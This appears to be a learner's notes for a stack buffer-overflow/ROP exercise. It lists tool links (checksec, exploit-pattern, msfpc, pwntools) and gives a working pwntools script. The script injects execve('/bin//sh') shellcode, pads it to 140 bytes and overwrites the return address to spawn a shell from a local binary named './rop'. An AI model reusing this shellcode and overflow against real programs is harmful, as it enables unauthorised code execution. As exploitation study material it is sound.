https://segmentfault.com/a/1190000005888964
http://peckerwood.top/post/rop_0x01/
### checksec
https://github.com/slimm609/checksec.sh

### pattern.py:
https://github.com/Svenito/exploit-pattern

### MSF
https://github.com/g0tmi1k/msfpc

### pwn tools
https://docs.pwntools.com/en/stable/

### code
```python
#!/usr/bin/env python3
from pwn import *
import binascii

p = process('./rop')
ret = 0xffffd080
# core dump的buf地址可能会改变，需要在一段时间后执行脚本要重新计算ret值
shellcode = b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode += b"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode += b"\x0b\xcd\x80"

#print (binascii.hexlify(shellcode))

"""
shellcode = asm('''
xor ecx, ecx
mul ecx
push ecx
push 0x68732f2f  
push 0x6e69622f   
mov ebx, esp
mov al, 11
int 0x80
''')
"""

code = shellcode
code += bytes(('A' * (140 - len(shellcode))).encode())
code += p32(ret)
print (binascii.hexlify(bytearray(code)))

p.send(code)

p.interactive()

```
